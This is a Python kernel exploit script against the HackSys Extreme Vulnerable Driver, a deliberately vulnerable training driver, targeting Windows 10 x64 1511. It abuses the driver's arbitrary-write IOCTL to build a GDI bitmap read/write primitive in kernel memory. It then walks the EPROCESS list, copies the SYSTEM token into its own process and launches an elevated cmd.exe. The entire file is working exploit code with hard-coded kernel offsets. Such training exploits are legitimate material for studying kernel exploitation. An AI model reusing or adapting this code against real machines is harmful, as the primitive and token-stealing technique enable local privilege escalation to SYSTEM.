import ctypes, struct, sys, os, win32con, time
from ctypes import *
from ctypes.wintypes import *
from win32com.shell import shell

ntdll = windll.ntdll
kernel32 = windll.kernel32
gdi32 = windll.gdi32

def debug_print(message):
	print message
	kernel32.OutputDebugStringA(message + "\n")
	
	
class SYSTEM_MODULE_INFORMATION(Structure):
    _fields_ = [("Reserved", c_void_p * 2),
                ("ImageBase", c_void_p), 
                ("ImageSize", c_long),
                ("Flags", c_ulong),
                ("LoadOrderIndex", c_ushort),
                ("InitOrderIndex", c_ushort),
                ("LoadCount", c_ushort),
                ("ModuleNameOffset", c_ushort),
                ("FullPathName", c_char * 256)]


def get_base_address(input_modules):
	modules = {}

	# Allocate arbitrary buffer and call NtQuerySystemInformation
	system_information = create_string_buffer(0)
	systeminformationlength = c_ulong(0)
	ntdll.NtQuerySystemInformation(11, system_information, len(system_information), byref(systeminformationlength))
	
	# Call NtQuerySystemInformation second time with right size
	system_information = create_string_buffer(systeminformationlength.value)
	ntdll.NtQuerySystemInformation(11, system_information, len(system_information), byref(systeminformationlength))
	
	# Read first 4 bytes which contains number of modules retrieved
	module_count = c_ulong(0)
	module_count_string = create_string_buffer(system_information.raw[:8])
	ctypes.memmove(addressof(module_count), module_count_string, sizeof(module_count))
	
	# Marshal each module information and store it in a dictionary<name, SYSTEM_MODULE_INFORMATION>
	system_information = create_string_buffer(system_information.raw[8:])
	for x in range(module_count.value):
		smi = SYSTEM_MODULE_INFORMATION()
		temp_system_information = create_string_buffer(system_information.raw[sizeof(smi) * x: sizeof(smi) * (x+1)])
		ctypes.memmove(addressof(smi), temp_system_information, sizeof(smi))
		module_name =  smi.FullPathName.split('\\')[-1]
		modules[module_name] = smi
		
	debug_print ("\r\n[+] NtQuerySystemInformation():")
		
	# Get base addresses and return them in a list
	base_addresses = []
	for input_module in input_modules:
		try:
			base_address = modules[input_module].ImageBase
			debug_print ("\t[-] %s base address: 0x%X" % (input_module, base_address))
			base_addresses.append(base_address)
		except:
			base_addresses.append(0)
	
	return base_addresses
		
	
def get_PsISP_kernel_address():	
	# Get kernel image base
	kernelImage = "ntoskrnl.exe"
	base_addresses = get_base_address(kernelImage.split())
	kernel_image_base = base_addresses[0]
	print "[+] Nt Base Address: 0x%X" % kernel_image_base
	
	# Load kernel image in userland and get PsInitialSystemProcess offset
	kernel32.LoadLibraryA.restype = HMODULE
	hKernelImage = kernel32.LoadLibraryA(kernelImage)
	print "[+] Loading %s in Userland" % kernelImage
	print "[+] %s Userland Base Address : 0x%X" % (kernelImage, hKernelImage)
	kernel32.GetProcAddress.restype = c_ulonglong
	kernel32.GetProcAddress.argtypes = (HMODULE, LPCSTR)
	PsISP_user_address = kernel32.GetProcAddress(hKernelImage,"PsInitialSystemProcess")
	print "[+] PsInitialSystemProcess Userland Base Address: 0x%X" % PsISP_user_address
	
	# Calculate PsInitialSystemProcess offset in kernel land
	PsISP_kernel_address_ptr = kernel_image_base + ( PsISP_user_address - hKernelImage)
	print "[+] PsInitialSystemProcess Kernel Base Address: 0x%X" % PsISP_kernel_address_ptr
	
	PsISP_kernel_address = c_ulonglong()
	read_virtual(PsISP_kernel_address_ptr, byref(PsISP_kernel_address), sizeof(PsISP_kernel_address));	
	
	return PsISP_kernel_address.value
	
	
hManager = HBITMAP()
hWorker = HBITMAP()
	
def setup_bitmaps():
	global hManager, hWorker
	dwReturn = c_void_p()
	gdi32.CreateBitmap.restype = HBITMAP
	hManager = gdi32.CreateBitmap(0x64, 0x64, 1, 32, dwReturn)
	hWorker = gdi32.CreateBitmap(0x64, 0x64, 1, 32, dwReturn)
	
	debug_print ("[+] Manager Bitmap handle: 0x%X" % hManager)
	debug_print ("[+] Worker Bitmap handle: 0x%X" % hWorker)
	
	
class PEB(Structure):
    _fields_ = [("Junk", c_byte * 0xF8),
				("GdiSharedHandleTable", c_void_p)]
	
class PROCESS_BASIC_INFORMATION(Structure):
    _fields_ = [("Reserved1", LPVOID),
				("PebBaseAddress", POINTER(PEB)),
				("Reserved2", LPVOID * 2),
				("UniqueProcessId", c_void_p),
				("Reserved3", LPVOID)]

def get_gdisharedhandletable_value():
	pbi = PROCESS_BASIC_INFORMATION()
	ntdll.NtQueryInformationProcess.argtypes = (HANDLE, UINT, c_void_p, ULONG, POINTER(ULONG))
	ntdll.NtQueryInformationProcess (kernel32.GetCurrentProcess(), 0, byref(pbi), sizeof(pbi), None)
	peb =  pbi.PebBaseAddress.contents
	
	return peb.GdiSharedHandleTable
	

class GDICELL64(Structure):
    _fields_ = [("pKernelAddress", c_void_p),
                ("wProcessId", c_ushort), 
                ("wCount", c_ushort),
                ("wUpper", c_ushort),
                ("wType", c_ushort),
                ("pUserAddress", c_void_p)]
	
def get_pvscan0_offset(handle):
	cell = get_gdisharedhandletable_value() + (handle & 0xFFFF) * sizeof(GDICELL64())
	gdicell64 = cast (cell, POINTER(GDICELL64))
	pvscan0_offset = gdicell64.contents.pKernelAddress + 0x50
	return pvscan0_offset
	
	
def set_address(address):
	global hManager
	write_buf = c_ulonglong(address)
	gdi32.SetBitmapBits.argtypes = (HBITMAP, c_ulonglong, LPVOID)
	gdi32.SetBitmapBits(hManager, sizeof(write_buf), addressof(write_buf));

	
def write_virtual(dest, src, len):
	global hWorker
	set_address(dest)
	gdi32.SetBitmapBits.argtypes = (HBITMAP, c_ulonglong, LPVOID)
	gdi32.SetBitmapBits(hWorker, len, src)
	
	
def read_virtual(src, dest, len):
	global hWorker
	set_address(src)
	gdi32.GetBitmapBits.argtypes = (HBITMAP, LONG, LPVOID)
	gdi32.GetBitmapBits(hWorker, len, dest)
	
	
# Win10 x64 1511 specific offsets
# kd> dt nt!_EPROCESS uniqueprocessid token
#   +0x2e8 UniqueProcessId : Ptr64 Void
#   +0x2f0 ActiveProcessLinks : _LIST_ENTRY
#      +0x000 Flink            : Ptr64 _LIST_ENTRY
#      +0x008 Blink            : Ptr64 _LIST_ENTRY
#   +0x358 Token           : _EX_FAST_REF

unique_process_id_offset = 0x2E8
active_process_links_offset = 0x2F0
token_offset = 0x358
	
# Get EPROCESS of current process
def get_current_eprocess(pEPROCESS):
	
	flink = c_ulonglong()
	read_virtual(pEPROCESS + active_process_links_offset, byref(flink), sizeof(flink));	
	
	current_pEPROCESS = 0
	while (1):
		unique_process_id = c_ulonglong(0)
		
		# Adjust EPROCESS pointer for next entry
		pEPROCESS = flink.value - unique_process_id_offset - 0x8
		
		# Get PID
		read_virtual(pEPROCESS + unique_process_id_offset, byref(unique_process_id), sizeof(unique_process_id));	
		
		# Check if we're in the current process
		if (os.getpid() == unique_process_id.value):
			current_pEPROCESS = pEPROCESS
			break
			
		read_virtual(pEPROCESS + active_process_links_offset, byref(flink), sizeof(flink));	
		
		# If next same as last, we've reached the end
		if (pEPROCESS == flink.value - unique_process_id_offset - 0x8):
			break
		
	return current_pEPROCESS
	
	
	
def trigger_arbitrary_overwrite():
	driver_handle = kernel32.CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver", 0xC0000000,0, None, 0x3, 0, None)
	if not driver_handle or driver_handle == -1:
		print "[!] Driver handle not found : Error " + str(ctypes.GetLastError())
		sys.exit()
		
	debug_print ("[+] Creating Bitmaps")
	setup_bitmaps()
	
	hManager_pvscan0_offset = get_pvscan0_offset(hManager)
	debug_print ("[+] Manager Bitmap pvscan0 offset: 0x%X" % hManager_pvscan0_offset)
	hWorker_pvscan0_offset = get_pvscan0_offset(hWorker)
	debug_print ("[+] Worker Bitmap pvscan0 offset: 0x%X" % hWorker_pvscan0_offset)
	
	write_where = hManager_pvscan0_offset
	write_what_ptr = c_void_p(hWorker_pvscan0_offset)	
	evil_input = struct.pack("<Q", addressof(write_what_ptr)) +  struct.pack("<Q", write_where)
	evil_input_ptr = id(evil_input) + 32
	evil_size  = len(evil_input)
	debug_print ("[+] Triggering W-W-W to overwrite Manager pvscan0 value with Worker pvscan0 address")
	dwReturn = c_ulong()
	kernel32.DeviceIoControl(driver_handle, 0x22200B, evil_input_ptr, evil_size, None, 0,byref(dwReturn), None)	
	
	# Get SYSTEM EPROCESS
	system_EPROCESS = get_PsISP_kernel_address()
	debug_print ("\r\n[+] SYSTEM EPROCESS: 0x%X" % system_EPROCESS)
	
	# Get current EPROCESS
	current_EPROCESS = get_current_eprocess(system_EPROCESS)
	debug_print ("[+] current EPROCESS: 0x%X" % current_EPROCESS)
	
	system_token = c_ulonglong()
	debug_print ("\r\n[+] Reading System TOKEN")
	read_virtual(system_EPROCESS + token_offset, byref(system_token), sizeof(system_token));
	debug_print ("[+] Writing System TOKEN")
	write_virtual(current_EPROCESS + token_offset, byref(system_token), sizeof(system_token));
	
	if shell.IsUserAnAdmin():
		print "[*] Enjoy Elevated Privs !\r\n"
		os.system('cmd.exe')
	else:
		print "[-] Exploit did not work. Re-run it!"
	

def preamble():
	debug_print ("")
	debug_print ("HackSys Extreme Vulnerable Driver : Arbitrary Overwrite")
	debug_print ("")
	debug_print ("Target Machine : Windows 10 64-bit (1511)")
	debug_print ("Author: @GradiusX")
	debug_print ("References: Abusing GDI for ring0 exploit primitives (Diego Juarez)")
	debug_print ("")
	
	
if __name__ == '__main__':
	preamble()
	trigger_arbitrary_overwrite()